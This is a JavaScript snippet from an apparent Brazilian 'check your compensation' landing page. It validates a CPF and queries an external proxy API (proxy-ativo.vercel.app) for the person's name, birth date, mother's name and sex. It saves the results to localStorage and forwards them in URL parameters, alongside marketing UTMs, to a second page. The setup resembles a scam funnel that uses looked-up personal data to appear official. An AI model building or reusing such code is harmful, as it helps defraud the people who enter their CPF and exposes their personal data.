  <script>
    // ===== HELPERS =====
    function toTitleCase(str) {
      if (!str) return '';
      return str.toLowerCase().replace(/\b\w/g, function (c) { return c.toUpperCase(); });
    }

    function formatDate(dateStr) {
      if (!dateStr) return '';
      var m = dateStr.match(/^(\d{2})[-\/](\d{2})[-\/](\d{4})$/);
      if (m) return m[1] + '/' + m[2] + '/' + m[3];
      m = dateStr.match(/(\d{4})[-\/](\d{2})[-\/](\d{2})/);
      if (m) return m[3] + '/' + m[2] + '/' + m[1];
      return dateStr.replace(/-/g, '/');
    }

    function removeMask(cpf) {
      return cpf.replace(/\D/g, '');
    }

    function formatCPF(cpf) {
      var digits = removeMask(cpf);
      return digits.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
    }

    function isValidCPF(cpf) {
      cpf = removeMask(cpf);
      if (cpf.length !== 11 || /^(.)\1+$/.test(cpf)) return false;
      var sum = 0, remainder, i;
      for (i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
      remainder = (sum * 10) % 11;
      if (remainder === 10 || remainder === 11) remainder = 0;
      if (remainder !== parseInt(cpf.substring(9, 10))) return false;
      sum = 0;
      for (i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
      remainder = (sum * 10) % 11;
      if (remainder === 10 || remainder === 11) remainder = 0;
      if (remainder !== parseInt(cpf.substring(10, 11))) return false;
      return true;
    }

    function resetBtn() {
      document.getElementById('btn-text').textContent = 'CONSULTAR INDENIZAÇÃO';
      document.getElementById('btn-spinner').classList.add('hidden');
      document.getElementById('submit-btn').disabled = false;
    }

    function showError(msg) {
      var el = document.getElementById('error-msg');
      el.textContent = msg;
      el.style.display = 'block';
      resetBtn();
    }

    // ===== INIT =====
    document.addEventListener('DOMContentLoaded', function () {
      var cpfInput = document.getElementById('cpf');

      // Máscara CPF
      cpfInput.addEventListener('input', function () {
        cpfInput.value = formatCPF(cpfInput.value);
      });

      // Submit
      document.getElementById('cpfForm').addEventListener('submit', function (e) {
        e.preventDefault();
        document.getElementById('error-msg').style.display = 'none';

        var cpfValue = removeMask(cpfInput.value);

        // 1. Validação local
        if (!isValidCPF(cpfValue)) {
          cpfInput.value = '';
          showError('ERRO: CPF INVÁLIDO. Digite novamente.');
          return;
        }

        // 2. Inicia loading
        document.getElementById('btn-text').textContent = 'CONSULTANDO...';
        document.getElementById('btn-spinner').classList.remove('hidden');
        document.getElementById('submit-btn').disabled = true;

        // 3. Consulta API e coleta TODOS os dados
        fetch('https://proxy-ativo.vercel.app/api/proxy?cpf=' + cpfValue, {
          method: 'GET',
          headers: { 'Accept': 'application/json' }
        })
          .then(function (response) {
            if (!response.ok) throw new Error('API retornou erro ' + response.status);
            return response.json();
          })
          .then(function (result) {
            var dados = result.dadosBasicos;

            if (!dados || !dados.nome) {
              showError('CPF não encontrado na base de dados. Verifique e tente novamente.');
              return;
            }

            // 4. Formata todos os campos
            var nome       = toTitleCase(dados.nome       || '');
            var nascimento = formatDate(dados.nascimento  || '');
            var mae        = toTitleCase(dados.mae        || '');
            var sexo       = dados.sexo === 'M' ? 'Masculino' : dados.sexo === 'F' ? 'Feminino' : '';
            var cpfFmt     = formatCPF(cpfValue);

            // 5. Salva no localStorage como fallback para páginas seguintes
            localStorage.setItem('nome',       nome);
            localStorage.setItem('nascimento', nascimento);
            localStorage.setItem('mae',        mae);
            localStorage.setItem('sexo',       sexo);
            localStorage.setItem('cpf',        cpfFmt);

            // 6. Monta URL com todos os dados + mantém UTMs já existentes
            var newParams = new URLSearchParams(window.location.search);
            newParams.set('cpf', cpfFmt);
            if (nome)       newParams.set('nome',       nome);
            if (nascimento) newParams.set('nascimento', nascimento);
            if (mae)        newParams.set('mae',        mae);
            if (sexo)       newParams.set('sexo',       sexo);

            // Remove entradas vazias
            var keysToDelete = [];
            newParams.forEach(function (v, k) {
              if (!v || !v.trim()) keysToDelete.push(k);
            });
            keysToDelete.forEach(function (k) { newParams.delete(k); });

            // 7. Redireciona para o HTML 2 com tudo na URL
            window.location.href = './parte2/index.html?' + newParams.toString();
          })
          .catch(function (error) {
            console.error('Erro na requisição:', error);
            showError('Erro ao conectar com a base de dados. Tente novamente.');
          });
      });
    });
  </script>
